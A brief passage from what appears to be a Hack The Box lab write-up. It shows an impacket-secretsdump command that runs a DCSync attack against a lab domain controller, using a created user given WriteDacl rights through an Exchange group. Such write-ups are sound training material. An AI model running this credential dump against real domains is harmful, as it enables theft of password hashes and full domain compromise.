![](<attachments/Pasted image 20260101200252.png>)
```bash
impacket-secretsdump htb.local/s4vitar:'s4vitar123!$'@10.129.30.182
```
Now it worked because we created the user s4vitar and added it to that Windows Exchange permission group that had WriteDacl permission, and thanks to that we were able to execute the DCSync attack.

![](<attachments/Pasted image 20260101200407.png>)

